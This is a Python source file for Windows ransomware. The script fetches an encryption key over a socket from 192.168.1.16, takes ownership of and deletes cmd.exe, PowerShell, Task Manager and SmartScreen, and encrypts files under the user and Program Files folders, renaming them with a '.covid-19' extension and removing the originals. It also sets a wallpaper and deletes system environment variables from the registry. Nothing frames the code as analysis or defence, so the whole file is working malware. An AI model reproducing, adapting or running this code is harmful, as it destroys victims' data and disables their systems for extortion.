#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.16", 8000))
enter = "[!] Transfert the key and the password :\n "
exit = "\n[!] Transfert [OK]"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()
# Function to get own process on windows
def tkOwn_process():
    proc = ['smartscreen.exe', 'taskmgr.exe', 'cmd.exe']
    for procs in proc:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\%s" %(procs)
        os.system(tkd)
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for procs in pwr_sh:
        tkd = "\\windows\\system32\\takeown.exe /F \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s" %(procs)
        os.system(tkd)
tkOwn_process()
# Get the current username
usr = os.environ["USERNAME"]
# Function to get full access on process windows with icacls command
def icc_powershell():
    procs = ['powershell.exe', 'powershell_ise.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
icc_powershell()
# Function to get full access on process windows with icacls command
def icc_sys32():
    procs = ['cmd.exe', 'smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
icc_sys32()
# Function to kill a process with force option here for SmartScreen
def pkill_smart():
    try:
        killed = "taskkill /IM smartscreen.exe /F"
        os.system(killed)
    except Exception:
        killed = 0
    return killed
pkill_smart()
# Function to delete a process in the system32 directory
def remove_proc():
    pwr_sh = ['powershell.exe', 'powershell_ise.exe']
    for proc in pwr_sh:
        cmd = "del \\windows\\system32\\WindowsPowerShell\\v1.0\\%s " %(proc)
        os.system(cmd)
    procs = ['smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        cmd = "del \\windows\\system32\\%s " %(proc)
        os.system(cmd)
remove_proc()
#FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)

            os.remove(name)
        except:
            pass
# WALLPAPER SETTINGS
path = os.getcwd()
img = "\setup\image.jpg"
Wallpaper = "%s%s" %(path, img)
filePath = shutil.copy(Wallpaper, '\\PerfLogs\\image.jpg')
SPI_SETDESKWALLPAPER = 20
WALLPAPER_PATH = '\\PerfLogs\\image.jpg'

def is_64_windows():
    """Find out how many bits is OS. """
    return struct.calcsize('P') * 8 == 64

def get_sys_parameters_info():
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA

def change_wallpaper():
    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
    # When the SPI_SETDESKWALLPAPER flag is used,
    # SystemParametersInfo returns TRUE
    # unless there is an error (like when the specified file doesn't exist).
    if not r:
        print(ctypes.WinError())

#LIST ALL FILE EXTENTIONS INVOKE FILE ENCTYPT FUNCTION IN THE DIR LIST .
def filelist():
    spec = ['/users/', '/Program Files/', '/Program Files (x86)/']
    for dir in spec:
        for root, dirs, files in os.walk(dir):
            for file in files:
                for ext in file.split("."):
                    try:
                        if file.endswith(ext):
                            ally = os.path.join(root, file)
                            print(ally)
                            file_ecrypt(key, ally)
                    except PermissionError:
                        pass
filelist()
change_wallpaper()
time.sleep(1)
# ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
def filelist_aux():
    mylist = ["jpg","png","log"]
    spec = "/PerfLogs/"
    for root, dirs, files in os.walk(spec):
        for file in files:
            for ext in mylist:
                try:
                    if file.endswith(ext):
                        ally = os.path.join(root, file)
                        print(ally)
                        file_ecrypt(key, ally)
                except:
                    pass
filelist_aux()
# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
def delSpecRules():
    regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
    for reg in regs:
        try:
            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
            os.system(cmd)
            time.sleep(1)
        except:
            pass
delSpecRules()
# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
def delRules():
    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
    for keys in range(0, 1024):
        try:
            keyname = winreg.EnumValue(aKey, keys)
            key, value, id = (keyname)
            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
            os.system(cmd)
        except OSError:
            pass
delRules()
os.remove("\\windows\\system32\\cmd.exe")
